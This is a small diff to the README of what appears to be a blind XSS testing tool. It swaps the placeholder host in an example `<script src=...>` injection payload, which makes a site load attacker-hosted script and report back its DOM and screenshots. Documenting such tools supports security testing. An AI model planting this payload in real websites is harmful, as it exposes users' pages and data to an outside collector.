@@ -40,7 +40,7 @@ Insert this payload to the website, alert will popup.
 ### Collecting data from blind XSS  
 You can find detailed report for your XSS, with DOM and Screenshort.  
 These request will be sent to slack, if specified in config.
-`<script src=https://example.com></script>`  
+`<script src=https://domain.com></script>`  
 ![blind xss](screenshots/blindxss.png)  
 
 
